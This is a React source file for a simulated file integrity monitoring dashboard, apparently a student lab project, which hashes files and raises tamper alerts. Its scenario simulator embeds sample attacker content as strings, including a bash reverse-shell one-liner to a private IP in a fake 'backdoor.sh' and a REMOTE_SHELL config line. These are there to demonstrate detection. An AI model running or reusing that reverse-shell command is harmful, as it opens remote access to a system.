import React, { useState, useEffect } from 'react';
import { Sidebar, TabType } from './components/Sidebar';
import { Header } from './components/Header';
import { DashboardView } from './components/DashboardView';
import { MonitoredFilesView } from './components/MonitoredFilesView';
import { AlertsView } from './components/AlertsView';
import { ActivityLogsView } from './components/ActivityLogsView';
import { DatabaseSchemaView } from './components/DatabaseSchemaView';
import { ProjectCodeHub } from './components/ProjectCodeHub';
import { VivaPrepView } from './components/VivaPrepView';
import { FileDetailsModal } from './components/FileDetailsModal';
import { AddFileModal } from './components/AddFileModal';
import { ScanModal } from './components/ScanModal';
import { MonitoredFile, SecurityAlert, ActivityLog, ScanTelemetry, AlertStatus } from './types';
import { INITIAL_FILES, INITIAL_ALERTS, INITIAL_LOGS } from './data/initialData';
import { computeSHA256 } from './utils/crypto';

export default function App() {
  const [activeTab, setActiveTab] = useState<TabType>('dashboard');
  const [files, setFiles] = useState<MonitoredFile[]>([]);
  const [alerts, setAlerts] = useState<SecurityAlert[]>(INITIAL_ALERTS);
  const [logs, setLogs] = useState<ActivityLog[]>(INITIAL_LOGS);

  const [selectedFile, setSelectedFile] = useState<MonitoredFile | null>(null);
  const [isAddModalOpen, setIsAddModalOpen] = useState(false);
  const [isScanning, setIsScanning] = useState(false);
  const [scanTelemetry, setScanTelemetry] = useState<ScanTelemetry | null>(null);
  const [isScanModalOpen, setIsScanModalOpen] = useState(false);

  // Initialize initial files with genuine cryptographic SHA-256 hashes
  useEffect(() => {
    async function initBaselines() {
      const initialized = await Promise.all(
        INITIAL_FILES.map(async (f) => {
          const hash = await computeSHA256(f.content);
          return {
            ...f,
            baselineHash: hash,
            currentHash: hash
          };
        })
      );
      setFiles(initialized);
    }
    initBaselines();
  }, []);

  // Update selected file reference if files array changes
  useEffect(() => {
    if (selectedFile) {
      const updated = files.find(f => f.id === selectedFile.id);
      if (updated) setSelectedFile(updated);
    }
  }, [files]);

  // Trigger full integrity scan
  const handleTriggerScan = async () => {
    setIsScanning(true);
    setIsScanModalOpen(true);
    const startTime = performance.now();

    // Simulated scanner delay for realistic telemetry
    await new Promise(r => setTimeout(r, 600));

    const nowStr = new Date().toISOString().replace('T', ' ').slice(0, 19);
    let safeCount = 0;
    let modifiedCount = 0;
    let deletedCount = 0;
    let newCount = 0;
    let newAlertsGenerated = 0;

    const newAlerts: SecurityAlert[] = [];
    const newLogs: ActivityLog[] = [];

    // First pass: identify modified and deleted
    const preEvaluated = files.map(file => {
      if (file.status === 'DELETED') {
        deletedCount++;
        return { file, detectedStatus: 'DELETED' as const };
      }
      if (file.status === 'NEW') {
        newCount++;
        return { file, detectedStatus: 'NEW' as const };
      }
      if (file.currentHash !== file.baselineHash) {
        modifiedCount++;
        return { file, detectedStatus: 'MODIFIED' as const };
      }
      safeCount++;
      return { file, detectedStatus: 'SAFE' as const };
    });

    // Threat detection rule evaluation
    preEvaluated.forEach(({ file, detectedStatus }) => {
      if (detectedStatus === 'SAFE') return;

      let alertLevel: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL' = 'LOW';
      let eventType = 'Unknown Event';
      let desc = '';

      if (detectedStatus === 'MODIFIED') {
        eventType = 'File Modification';
        if (modifiedCount >= 3) {
          alertLevel = 'CRITICAL';
          desc = `Mass modification pattern detected: ${modifiedCount} files modified simultaneously. Possible ransomware or batch script tampering.`;
        } else if (file.isImportantConfig || file.category === 'config') {
          alertLevel = 'HIGH';
          desc = `Critical configuration file '${file.fileName}' was modified. Integrity baseline violated; verify authorization.`;
        } else {
          alertLevel = 'MEDIUM';
          desc = `Cryptographic SHA-256 hash mismatch for '${file.fileName}'. Content altered since baseline.`;
        }
      } else if (detectedStatus === 'DELETED') {
        eventType = 'File Deletion';
        alertLevel = 'HIGH';
        desc = `Monitored critical file '${file.fileName}' was removed from filesystem. Missing baseline asset.`;
      } else if (detectedStatus === 'NEW') {
        eventType = 'Unregistered File Discovery';
        if (file.fileExtension === '.sh' || file.fileExtension === '.exe' || file.fileExtension === '.py') {
          alertLevel = 'HIGH';
          desc = `Unregistered executable/script '${file.fileName}' discovered in monitored directory.`;
        } else {
          alertLevel = 'LOW';
          desc = `New unmonitored file '${file.fileName}' found in directory.`;
        }
      }

      const alertId = `ALT-${Date.now().toString().slice(-4)}-${file.id}`;
      newAlerts.push({
        id: Date.now() + file.id,
        alertId,
        fileId: file.id,
        fileName: file.fileName,
        filePath: file.filePath,
        eventType,
        alertLevel,
        previousHash: file.baselineHash,
        currentHash: file.currentHash,
        timestamp: nowStr,
        status: 'Open',
        description: desc,
        forensicDistinction: 'File integrity baseline violation recorded. Triaging required to confirm authorization.'
      });

      newLogs.push({
        id: Date.now() + file.id + 100,
        timestamp: nowStr,
        fileName: file.fileName,
        eventType: `SCAN_${detectedStatus}`,
        previousHash: file.baselineHash,
        currentHash: file.currentHash,
        status: detectedStatus,
        alertLevel,
        details: desc
      });

      newAlertsGenerated++;
    });

    // General scan completion log
    newLogs.unshift({
      id: Date.now(),
      timestamp: nowStr,
      fileName: 'System Scan',
      eventType: 'INTEGRITY_SCAN_COMPLETED',
      previousHash: 'N/A',
      currentHash: 'N/A',
      status: modifiedCount > 0 || deletedCount > 0 ? 'MODIFIED' : 'SAFE',
      alertLevel: modifiedCount >= 3 ? 'CRITICAL' : modifiedCount > 0 ? 'HIGH' : 'LOW',
      details: `Full integrity scan completed. Total: ${files.length}, Safe: ${safeCount}, Modified: ${modifiedCount}, Deleted: ${deletedCount}, Alerts: ${newAlertsGenerated}`
    });

    // Update files lastScanTime and status
    setFiles(prev => prev.map(f => {
      const match = preEvaluated.find(p => p.file.id === f.id);
      return {
        ...f,
        status: match ? match.detectedStatus : f.status,
        lastScanTime: nowStr
      };
    }));

    if (newAlerts.length > 0) {
      setAlerts(prev => [...newAlerts, ...prev]);
    }
    setLogs(prev => [...newLogs, ...prev]);

    const elapsedMs = Math.round(performance.now() - startTime);
    const telemetry: ScanTelemetry = {
      timestamp: nowStr,
      totalScanned: files.length,
      safeCount,
      modifiedCount,
      deletedCount,
      newCount,
      alertsGenerated: newAlertsGenerated,
      elapsedMs
    };

    setScanTelemetry(telemetry);
    setIsScanning(false);
  };

  // Add new file to monitor
  const handleAddFile = (newFile: Omit<MonitoredFile, 'id' | 'status' | 'firstMonitoredTime' | 'lastScanTime'>) => {
    const nowStr = new Date().toISOString().replace('T', ' ').slice(0, 19);
    const created: MonitoredFile = {
      ...newFile,
      id: Date.now(),
      status: 'SAFE',
      firstMonitoredTime: nowStr,
      lastScanTime: nowStr
    };

    setFiles(prev => [created, ...prev]);

    // Log the baseline creation
    setLogs(prev => [
      {
        id: Date.now(),
        timestamp: nowStr,
        fileName: created.fileName,
        eventType: 'BASELINE_ESTABLISHED',
        previousHash: 'N/A',
        currentHash: created.baselineHash,
        status: 'SAFE',
        alertLevel: 'LOW',
        details: `Cryptographic SHA-256 fingerprint generated and registered for ${created.fileName}.`
      },
      ...prev
    ]);
  };

  // Update file content simulated edit
  const handleUpdateFileContent = async (fileId: number, newContent: string) => {
    const newHash = await computeSHA256(newContent);
    const nowStr = new Date().toISOString().replace('T', ' ').slice(0, 19);

    setFiles(prev => prev.map(f => {
      if (f.id === fileId) {
        const isModified = newHash !== f.baselineHash;
        return {
          ...f,
          content: newContent,
          fileSize: newContent.length,
          currentHash: newHash,
          status: isModified ? 'MODIFIED' : 'SAFE'
        };
      }
      return f;
    }));

    setLogs(prev => [
      {
        id: Date.now(),
        timestamp: nowStr,
        fileName: files.find(f => f.id === fileId)?.fileName || 'File',
        eventType: 'CONTENT_MODIFIED',
        previousHash: files.find(f => f.id === fileId)?.baselineHash || '',
        currentHash: newHash,
        status: 'MODIFIED',
        alertLevel: 'MEDIUM',
        details: 'Simulated content modification saved. Recalculated SHA-256 hash.'
      },
      ...prev
    ]);
  };

  // Restore file baseline
  const handleRestoreBaseline = async (fileId: number) => {
    const target = files.find(f => f.id === fileId);
    if (!target) return;

    setFiles(prev => prev.map(f => {
      if (f.id === fileId) {
        return {
          ...f,
          currentHash: f.baselineHash,
          status: 'SAFE'
        };
      }
      return f;
    }));

    const nowStr = new Date().toISOString().replace('T', ' ').slice(0, 19);
    setLogs(prev => [
      {
        id: Date.now(),
        timestamp: nowStr,
        fileName: target.fileName,
        eventType: 'BASELINE_RESTORED',
        previousHash: target.currentHash,
        currentHash: target.baselineHash,
        status: 'SAFE',
        alertLevel: 'LOW',
        details: `Remediated ${target.fileName}: restored content matching authoritative baseline digest.`
      },
      ...prev
    ]);
  };

  // Delete file
  const handleDeleteFile = (fileId: number) => {
    setFiles(prev => prev.map(f => {
      if (f.id === fileId) {
        return {
          ...f,
          status: 'DELETED',
          currentHash: 'FILE_REMOVED'
        };
      }
      return f;
    }));

    const nowStr = new Date().toISOString().replace('T', ' ').slice(0, 19);
    setLogs(prev => [
      {
        id: Date.now(),
        timestamp: nowStr,
        fileName: files.find(f => f.id === fileId)?.fileName || 'File',
        eventType: 'FILE_DELETED',
        previousHash: files.find(f => f.id === fileId)?.baselineHash || '',
        currentHash: 'DELETED',
        status: 'DELETED',
        alertLevel: 'HIGH',
        details: 'File was deleted from disk. Monitored asset missing.'
      },
      ...prev
    ]);
  };

  // Update alert status
  const handleUpdateAlertStatus = (alertId: string, status: AlertStatus) => {
    setAlerts(prev => prev.map(a => {
      if (a.alertId === alertId) {
        return { ...a, status };
      }
      return a;
    }));
  };

  // Quick Viva / Lab Scenarios
  const handleSimulateScenario = async (scenario: string) => {
    if (scenario === 'modify_config') {
      // Modify app.conf
      const target = files.find(f => f.fileName === 'app.conf');
      if (target) {
        const tamperedContent = target.content + `\n# [UNAUTHORIZED ATTACKER INSERTION]\nREMOTE_SHELL=192.168.1.200:4444\nALLOW_ROOT=True`;
        await handleUpdateFileContent(target.id, tamperedContent);
      }
    } else if (scenario === 'drop_executable') {
      // Drop suspicious executable backdoor.sh
      const shContent = `#!/bin/bash\n# Attacker reverse shell\nbash -i >& /dev/tcp/10.0.0.1/9001 0>&1`;
      const hash = await computeSHA256(shContent);
      handleAddFile({
        fileName: 'backdoor.sh',
        filePath: '/usr/local/bin/backdoor.sh',
        fileExtension: '.sh',
        fileSize: shContent.length,
        content: shContent,
        baselineHash: hash,
        currentHash: hash,
        category: 'script',
        isImportantConfig: false
      });
      // Mark as NEW so scan detects it as newly introduced
      setFiles(prev => prev.map(f => f.fileName === 'backdoor.sh' ? { ...f, status: 'NEW' } : f));
    } else if (scenario === 'mass_tamper') {
      // Tamper with 3 files at once
      for (const f of files.slice(0, 3)) {
        const tampered = f.content + `\n# ENCRYPTED_BY_RANSOMWARE_${Date.now()}`;
        await handleUpdateFileContent(f.id, tampered);
      }
    } else if (scenario === 'delete_file') {
      // Delete database backup
      const target = files.find(f => f.fileName === 'database_backup.sql') || files[files.length - 1];
      if (target) {
        handleDeleteFile(target.id);
      }
    }

    // Automatically run the scan to show immediate detection!
    handleTriggerScan();
  };

  // Reset all files to clean baseline state
  const handleResetBaseline = async () => {
    const cleanFiles = await Promise.all(
      INITIAL_FILES.map(async (f) => {
        const hash = await computeSHA256(f.content);
        return {
          ...f,
          baselineHash: hash,
          currentHash: hash,
          status: 'SAFE' as const
        };
      })
    );
    setFiles(cleanFiles);
    setAlerts(INITIAL_ALERTS);
    setLogs(INITIAL_LOGS);
  };

  // Select folder preset
  const handleSelectFolderToMonitor = () => {
    setIsAddModalOpen(true);
  };

  return (
    <div id="fim-app" className="flex min-h-screen bg-slate-950 text-slate-100 font-sans antialiased">
      {/* Sidebar Navigation */}
      <Sidebar
        activeTab={activeTab}
        setActiveTab={setActiveTab}
        openAlertsCount={alerts.filter(a => a.status === 'Open').length}
        onTriggerScan={handleTriggerScan}
        isScanning={isScanning}
      />

      {/* Main Content Area */}
      <div className="flex-1 flex flex-col min-w-0">
        <Header
          onTriggerScan={handleTriggerScan}
          isScanning={isScanning}
          onOpenAddModal={() => setIsAddModalOpen(true)}
          onSimulateScenario={handleSimulateScenario}
          onResetBaseline={handleResetBaseline}
        />

        <main className="flex-1 p-6 md:p-8 max-w-7xl w-full mx-auto">
          {activeTab === 'dashboard' && (
            <DashboardView
              files={files}
              alerts={alerts}
              logs={logs}
              onTriggerScan={handleTriggerScan}
              isScanning={isScanning}
              onNavigateTab={setActiveTab}
              onSelectFile={setSelectedFile}
              onUpdateAlertStatus={handleUpdateAlertStatus}
              onSimulateScenario={handleSimulateScenario}
            />
          )}

          {activeTab === 'files' && (
            <MonitoredFilesView
              files={files}
              onSelectFile={setSelectedFile}
              onOpenAddModal={() => setIsAddModalOpen(true)}
              onSimulateEdit={(id) => {
                const f = files.find(item => item.id === id);
                if (f) {
                  handleUpdateFileContent(id, f.content + '\n# [SIMULATED TAMPERING: altered byte]');
                  handleTriggerScan();
                }
              }}
              onDeleteFile={(id) => {
                handleDeleteFile(id);
                handleTriggerScan();
              }}
              onRestoreBaseline={handleRestoreBaseline}
              onSelectFolderToMonitor={handleSelectFolderToMonitor}
            />
          )}

          {activeTab === 'alerts' && (
            <AlertsView
              alerts={alerts}
              onUpdateAlertStatus={handleUpdateAlertStatus}
            />
          )}

          {activeTab === 'logs' && (
            <ActivityLogsView logs={logs} />
          )}

          {activeTab === 'database' && (
            <DatabaseSchemaView
              files={files}
              alerts={alerts}
              logs={logs}
            />
          )}

          {activeTab === 'code_hub' && (
            <ProjectCodeHub />
          )}

          {activeTab === 'viva_prep' && (
            <VivaPrepView />
          )}
        </main>
      </div>

      {/* File Details Inspection Modal */}
      {selectedFile && (
        <FileDetailsModal
          file={selectedFile}
          onClose={() => setSelectedFile(null)}
          onUpdateFileContent={handleUpdateFileContent}
          onRestoreBaseline={handleRestoreBaseline}
        />
      )}

      {/* Add File / Register Baseline Modal */}
      <AddFileModal
        isOpen={isAddModalOpen}
        onClose={() => setIsAddModalOpen(false)}
        onAddFile={handleAddFile}
      />

      {/* Live Scan Telemetry Modal */}
      <ScanModal
        isOpen={isScanModalOpen}
        isScanning={isScanning}
        telemetry={scanTelemetry}
        onClose={() => setIsScanModalOpen(false)}
        onViewAlerts={() => {
          setIsScanModalOpen(false);
          setActiveTab('alerts');
        }}
      />
    </div>
  );
}
